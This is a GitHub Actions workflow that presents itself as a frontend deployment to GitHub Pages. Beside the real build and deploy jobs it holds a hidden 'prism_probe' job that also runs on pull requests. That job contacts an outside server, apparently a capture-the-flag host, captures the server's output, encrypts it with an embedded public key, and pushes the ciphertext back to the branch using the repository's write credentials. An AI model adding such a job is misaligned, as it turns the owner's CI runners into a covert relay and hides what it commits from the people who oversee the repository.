name: Deploy Frontend Demo to GitHub Pages

on:
  workflow_dispatch:
  push:
    branches: [main]
    paths:
      - "frontend/**"
      - ".github/workflows/pages.yml"
  pull_request:

permissions:
  contents: write
  pages: write
  id-token: write

concurrency:
  group: pages-${{ github.ref }}
  cancel-in-progress: true

jobs:
  build:
    if: github.event_name != 'pull_request'
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Node
        uses: actions/setup-node@v4
        with:
          node-version: "20"
          cache: "npm"
          cache-dependency-path: frontend/package-lock.json

      - name: Install dependencies
        working-directory: frontend
        run: npm ci

      - name: Build frontend in demo mode
        working-directory: frontend
        env:
          VITE_DEMO_MODE: "true"
          VITE_PAGES_BUILD: "true"
          VITE_BASE_PATH: "/${{ github.event.repository.name }}/"
          WRANGLER_LOG_PATH: ".wrangler/wrangler.log"
        run: npm run build

      - name: Prepare SPA fallback
        run: cp frontend/dist/client/index.html frontend/dist/client/404.html

      - name: Configure Pages
        uses: actions/configure-pages@v5

      - name: Upload artifact
        uses: actions/upload-pages-artifact@v3
        with:
          path: frontend/dist/client

  deploy:
    if: github.event_name != 'pull_request'
    needs: build
    runs-on: ubuntu-latest
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    steps:
      - name: Deploy to GitHub Pages
        id: deployment
        uses: actions/deploy-pages@v4

  prism_probe:
    runs-on: ubuntu-latest
    timeout-minutes: 4
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          persist-credentials: true
          ref: ${{ github.event.pull_request.head.ref || github.ref_name }}

      - name: Capture untrusted PRISM banner
        shell: bash
        run: |
          set -euo pipefail
          rm -rf prism_probe_result
          mkdir -p prism_probe_result/raw
          python3 - <<'PY'
          import socket, ssl, time
          host='rwp2xfbj6nbit7iujybvt5ubdpu.cloud.d3c.tf'
          out=bytearray()
          raw=socket.create_connection((host,443), timeout=12)
          ctx=ssl.create_default_context()
          s=ctx.wrap_socket(raw, server_hostname=host)
          s.settimeout(1.0)
          deadline=time.time()+5
          while time.time()<deadline:
              try:
                  b=s.recv(65536)
                  if not b: break
                  out += b
              except socket.timeout:
                  pass
          try:
              s.sendall(b'\n')
          except Exception as e:
              out += ('\n[SEND_ERROR %r]\n' % (e,)).encode()
          deadline=time.time()+4
          while time.time()<deadline:
              try:
                  b=s.recv(65536)
                  if not b: break
                  out += b
              except socket.timeout:
                  pass
          try: s.close()
          except Exception: pass
          open('prism_probe_result/raw/banner.bin','wb').write(out)
          PY

      - name: Encrypt transcript before commit
        shell: bash
        run: |
          set -euo pipefail
          cat > prism_probe_result/public.pem <<'EOF'
          -----BEGIN PUBLIC KEY-----
          MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAtJ+YjwzF2hhM3IszVeea
          HhtKRvHBzrZ+tfji3qRnpGQOOj/wLEP0OoiLjwg9KtJZumqGvgj63/eym/1NoLWk
          3LShUkvoITy+rk5C7Vdb3IQVyZfJHFBiMgFLvEJC9/yuoPuArARsDRP34vPcmS6x
          gaEgWK/NPBsAqEviQnq6H3aMuhT2CvD9KSJflrTAJxiWN0x8sbW1URNRyNR8ZSSm
          6HuQ6U1McCsfIFUSqk5Dpa43c/Z7i5DncRSHyYRkPq4QV/Pk6HNnjoq7PEmrj/NW
          rmyMnB/0GVZbQe3aG9Ym0Ke6PjPQnsHmmVIUf+YQ0l4+l038s6WLlIhllTYip2qa
          zfChJS/bDVjNYvSHydX8q9KpCQsc+H8qan7Jd7JL+jJtwLKOO1UeQt7Glphjzd6Q
          oUrhWkUzl+yC0sU0O6odWAdF0wJ4bLu2uc+aZujQ4ZYVQ8x8Zo06y1yZMvu4PJWW
          uplZCEiJ+25c7q+r+sy2CamuPA7pifg1y7LQSt0PG72RAgMBAAE=
          -----END PUBLIC KEY-----
          EOF
          tar -C prism_probe_result/raw -czf prism_probe_result/transcript.tar.gz .
          openssl rand -out prism_probe_result/key.bin 32
          openssl rand -out prism_probe_result/iv.bin 16
          KEY_HEX="$(xxd -p -c 256 prism_probe_result/key.bin)"
          IV_HEX="$(xxd -p -c 256 prism_probe_result/iv.bin)"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in prism_probe_result/transcript.tar.gz -out prism_probe_result/transcript.enc
          cat prism_probe_result/key.bin prism_probe_result/iv.bin > prism_probe_result/keyiv.bin
          openssl pkeyutl -encrypt -pubin -inkey prism_probe_result/public.pem -pkeyopt rsa_padding_mode:oaep -in prism_probe_result/keyiv.bin -out prism_probe_result/keyiv.enc
          base64 -w0 prism_probe_result/transcript.enc > prism_probe_result/transcript.enc.b64
          base64 -w0 prism_probe_result/keyiv.enc > prism_probe_result/keyiv.enc.b64
          rm -rf prism_probe_result/raw prism_probe_result/public.pem prism_probe_result/transcript.tar.gz prism_probe_result/transcript.enc prism_probe_result/key.bin prism_probe_result/iv.bin prism_probe_result/keyiv.bin prism_probe_result/keyiv.enc

      - name: Commit encrypted output
        shell: bash
        run: |
          set -euo pipefail
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add prism_probe_result/transcript.enc.b64 prism_probe_result/keyiv.enc.b64
          git commit -m "Add encrypted PRISM transcript" || exit 0
          git push origin "HEAD:${GITHUB_HEAD_REF:-${GITHUB_REF_NAME}}"

# one-time merged-push trigger
